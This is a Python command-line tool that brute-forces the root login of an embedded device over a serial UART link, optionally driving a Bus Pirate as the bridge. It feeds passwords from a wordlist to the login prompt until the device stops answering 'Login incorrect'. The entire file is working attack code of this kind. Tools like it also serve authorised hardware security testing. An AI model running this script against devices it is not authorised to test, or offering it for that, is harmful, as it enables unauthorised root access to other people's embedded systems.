#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import serial
from time import sleep, time
from argparse import ArgumentParser, FileType
from datetime import datetime
from traceback import format_exc

LOG_FORMAT = '%(asctime)s - %(levelname)s - %(message)s'
DATE_FORMAT = '%Y-%m-%d %H:%M:%S'
VERSION = '1.0'
LOG_LEVEL = logging.DEBUG

LOGIN_TEXT = '(none) login:'
PASS_TEXT = 'Password:'
LOGIN_INCORRECT = 'Login incorrect'
BUSPIRATE_PATTERN = 'HiZ>'

logger = logging.getLogger('UART Bruteforce')
logger.setLevel(LOG_LEVEL)
formatter = logging.Formatter(LOG_FORMAT, DATE_FORMAT)

stream_handler = logging.StreamHandler()
stream_handler.setFormatter(formatter)
stream_handler.setLevel(LOG_LEVEL)
logger.addHandler(stream_handler)
date_format_filename = datetime.now().strftime("%Y%m%d_%H%M%S")
file_handler = logging.FileHandler('log_{}.txt'.format(date_format_filename), mode='a', encoding='utf-8')
file_handler.setFormatter(formatter)
file_handler.setLevel(LOG_LEVEL)
logger.addHandler(file_handler)


def setup_buspirate(ser):
    logger.info('Setting up buspirate...')
    # mode
    ser.write(b"m\n")
    print(recieve(ser))
    # uart
    ser.write(b"3\n")
    print(recieve(ser))
    # 115200
    ser.write(b"9\n")
    print(recieve(ser))
    ser.write(b"1\n")
    print(recieve(ser))
    ser.write(b"1\n")
    print(recieve(ser))
    ser.write(b"1\n")
    print(recieve(ser))
    # normal
    ser.write(b"2\n")
    print(recieve(ser))
    # start bridge
    ser.write(b"(3)\n")
    print(recieve(ser))
    # confirm
    ser.write(b"y\n")


def recieve(ser):
    to_recieve = ser.in_waiting
    sleep(.5)
    while to_recieve < ser.in_waiting:
        to_recieve = ser.in_waiting
        sleep(1)
    content = ser.read(to_recieve).decode()
    return content


def main(device, speed, user, wordlist):
    with serial.Serial(device, speed, timeout=0) as ser:
        ser.reset_input_buffer()
        ser.reset_output_buffer()
        ser.write(b"\n\n")
        content = recieve(ser)
        if BUSPIRATE_PATTERN in content:
            setup_buspirate(ser)
            content = recieve(ser)

        for line in wordlist:
            if LOGIN_TEXT not in content:
                raise ValueError('Not LOGIN_TEXT return: {}'.format(content))
            password = line.strip().encode()
            logger.debug('Trying password {}'.format(line.strip()))
            ser.write(user.encode())
            ser.write(b"\n")
            content = recieve(ser)

            if PASS_TEXT not in content:
                raise ValueError('Invalid return: {}'.format(content))
            ser.write(password)
            ser.write(b"\n")
            content = recieve(ser)
            # password checking takes a while
            while content is '\n' or content is '':
                content = recieve(ser)

            logger.debug('Password response: {}'.format(repr(content)))
            if LOGIN_INCORRECT not in content:
                logger.info('Found password? Pass: {}, Return: {}'.format(password, content))
                return


if __name__ == '__main__':
    overall_start_time = time()
    parser = ArgumentParser(description='Bruteforces a login via UART')
    parser.add_argument('-d', dest='device', type=str, required=True, help="The serial device. eg /dev/tty.usbmodem")
    parser.add_argument('-s', '--speed', type=int, dest='speed', default=115200, help='Baud rate')
    parser.add_argument('-u', '--user', type=str, dest='user', default='root', help='Username to bruteforce')
    parser.add_argument('-w', '--wordlist', type=FileType('rt'), dest='wordlist', required=True,
                        help='Wordlist used for bruteforcing')
    parser.add_argument('--version', action='version', version='%(prog)s {}'.format(VERSION))
    args = parser.parse_args()
    try:
        main(args.device, args.speed, args.user, args.wordlist)
    except Exception as e:
        logger.critical('Exception: {}'.format(e))
        logger.critical(format_exc())

    logger.info('script finished: {} seconds'.format(round(time() - overall_start_time, 2)))
